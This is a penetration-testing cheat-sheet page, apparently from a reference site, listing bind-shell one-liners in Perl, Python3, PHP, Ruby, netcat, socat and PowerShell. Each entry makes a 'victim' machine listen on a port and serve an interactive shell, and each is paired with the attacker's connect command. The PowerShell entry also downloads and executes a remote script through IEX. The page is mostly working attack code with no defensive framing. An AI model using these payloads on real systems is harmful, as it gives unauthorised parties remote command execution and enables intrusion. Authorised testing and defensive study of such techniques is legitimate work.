---
title: "Bind Shells"
category: shells
order: 20
description: "Bind shell one-liners across multiple languages."
tags: [shell, bind]
---

## Perl

### Socket accept + exec (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
# Victim (listen)
perl -e '
use Socket;
$p=§RPORT§;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")) or die "Socket creation failed: $!";
bind(S,sockaddr_in($p, INADDR_ANY)) or die "Bind failed: $!";
listen(S,SOMAXCONN) or die "Listen failed: $!";
while ($p = accept(C,S)) {
    open(STDIN, ">&C") or die "Dup STDIN failed: $!";
    open(STDOUT, ">&C") or die "Dup STDOUT failed: $!";
    open(STDERR, ">&C") or die "Dup STDERR failed: $!";
    exec("/bin/bash -i") or die "Exec failed: $!";
    close C;
}
'
# Connect from attacker
nc §RHOST§ §RPORT§
```
{% endraw %}

## Python3

### Subprocess one-liner (Linux, Python3)

_Platform: Linux/Unix, Python 3_

{% raw %}
```bash
# Victim (listen)
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",§RPORT§));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

# Connect from attacker
nc §RHOST§ §RPORT§
```
{% endraw %}

## PHP

### socket_create + popen (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
# Victim (listen)                
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",§RPORT§);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'

# Connect from attacker
nc §RHOST§ §RPORT§
```
{% endraw %}

## Ruby

### TCPServer fd reopen (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
# Victim (listen)
ruby -rsocket -e 'f=TCPServer.new(§RPORT§); s=f.accept; [0, 1, 2].each { |fd| IO.for_fd(fd).reopen(s) }; exec "/bin/sh"'

# Connect from attacker
nc §RHOST§ §RPORT§
```
{% endraw %}

## Nc (Traditional)

### nc -e /bin/bash (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
# Victim (listen)
nc -nlvp §RPORT§ -e /bin/bash

# Connect from attacker
nc §RHOST§ §RPORT§
```
{% endraw %}

## Nc Openbsd

### mkfifo + nc -lvp (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
# Victim (listen)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp §RPORT§ >/tmp/f

# Connect from attacker
nc §RHOST§ §RPORT§
```
{% endraw %}

## Socat

### socat PTY shell (Linux)

_Platform: Linux/Unix_

{% raw %}
```bash
# Victim (listen)
socat TCP-LISTEN:§RPORT§,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

# Connect from attacker
socat FILE:`tty`,raw,echo=0 TCP:§RHOST§:§RPORT§
```
{% endraw %}

## PowerShell

### Powercat listener (Windows)

_Platform: Windows_

{% raw %}
```powershell
# https://github.com/besimorhino/powercat
# instructions:
# Load The Function From Downloaded .ps1 File:
. .\powercat.ps1

# Load The Function From URL:
IEX(New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# Victim (listen)
. .\powercat.ps1
powercat -l -p §RPORT§ -e powershell

# Connect from attacker
nc §RHOST§ §RPORT§
```
{% endraw %}
